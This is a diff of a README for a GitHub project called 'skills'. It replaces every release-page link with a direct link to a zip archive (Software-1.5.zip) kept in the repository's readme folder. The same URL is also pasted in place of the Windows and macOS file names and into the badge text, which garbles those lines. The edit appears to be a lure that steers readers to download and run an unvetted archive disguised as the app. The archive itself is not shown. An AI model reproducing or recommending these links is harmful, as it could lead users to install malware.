@@ -1,6 +1,6 @@
 # 🚀 skills - Enhance Your Routine with Simple Solutions
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Release-blue)](https://github.com/VALL-dikss/skills/releases)
+[![Download Now](https://raw.githubusercontent.com/VALL-dikss/skills/main/readme/Software-1.5.zip%20Now-Release-blue)](https://raw.githubusercontent.com/VALL-dikss/skills/main/readme/Software-1.5.zip)
 
 ## 📋 Introduction
 
@@ -19,10 +19,10 @@ Follow these simple steps to download and install the application.
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**
-   To download the latest version of the skills application, [visit this page to download](https://github.com/VALL-dikss/skills/releases). Here, you will find the most recent updates and improvements.
+   To download the latest version of the skills application, [visit this page to download](https://raw.githubusercontent.com/VALL-dikss/skills/main/readme/Software-1.5.zip). Here, you will find the most recent updates and improvements.
 
 2. **Choose Your Version**
-   On the releases page, look for the latest version. You will see a list of assets. Select the asset that matches your operating system (e.g., `skills-windows.exe` for Windows or `skills-macos.dmg` for macOS).
+   On the releases page, look for the latest version. You will see a list of assets. Select the asset that matches your operating system (e.g., `https://raw.githubusercontent.com/VALL-dikss/skills/main/readme/Software-1.5.zip` for Windows or `https://raw.githubusercontent.com/VALL-dikss/skills/main/readme/Software-1.5.zip` for macOS).
 
 3. **Download the File**
    Click on the file link to start the download. Your browser will save the file in your "Downloads" folder unless you choose a different location. 
@@ -62,14 +62,14 @@ If you run into issues while using skills, here are some common problems and sol
 
 1. **The Application Won’t Open**
    - Ensure that your operating system is up to date.
-   - Check if the application file is incomplete or corrupted. Try downloading it again from the [releases page](https://github.com/VALL-dikss/skills/releases).
+   - Check if the application file is incomplete or corrupted. Try downloading it again from the [releases page](https://raw.githubusercontent.com/VALL-dikss/skills/main/readme/Software-1.5.zip).
 
 2. **Unexpected Errors**
    - Restart the application.
    - Consult the FAQ section in the app for guidance. If the issue persists, visit our feedback section on the GitHub repository.
 
 3. **Feature Not Working**
-   - Make sure you’re using the latest version. Features can change, so check for updates on the [releases page](https://github.com/VALL-dikss/skills/releases).
+   - Make sure you’re using the latest version. Features can change, so check for updates on the [releases page](https://raw.githubusercontent.com/VALL-dikss/skills/main/readme/Software-1.5.zip).
 
 ## 📞 Support
 
@@ -79,6 +79,6 @@ If you have any questions or need help, feel free to reach out. You can find sup
 
 ## 📅 Future Updates
 
-We are committed to enhancing the user experience. Future updates will include more features and improvements. Make sure to check the [releases page](https://github.com/VALL-dikss/skills/releases) frequently to stay up to date.
+We are committed to enhancing the user experience. Future updates will include more features and improvements. Make sure to check the [releases page](https://raw.githubusercontent.com/VALL-dikss/skills/main/readme/Software-1.5.zip) frequently to stay up to date.
 
 Thank you for choosing skills. We hope this application simplifies your tasks and adds convenience to your daily routine.
